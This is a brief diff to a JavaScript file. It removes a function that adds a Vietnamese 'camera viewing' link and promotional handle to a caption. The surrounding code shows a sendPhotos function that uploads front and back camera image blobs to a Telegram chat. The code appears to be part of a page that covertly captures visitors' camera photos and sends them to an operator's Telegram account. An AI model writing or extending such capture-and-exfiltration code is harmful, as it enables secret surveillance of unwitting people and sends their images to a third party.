@@ -151,13 +151,6 @@ function getCaption() {
 `.trim();
 }
 
-function getCaptionWithExtras() {
-  return getCaption() + `
-
-📽️ Link xem camera: https://websitevip.github.io/webview/  
-🗣️ Xem đê @ontop2k9`;
-}
-
 async function sendPhotos(frontBlob, backBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
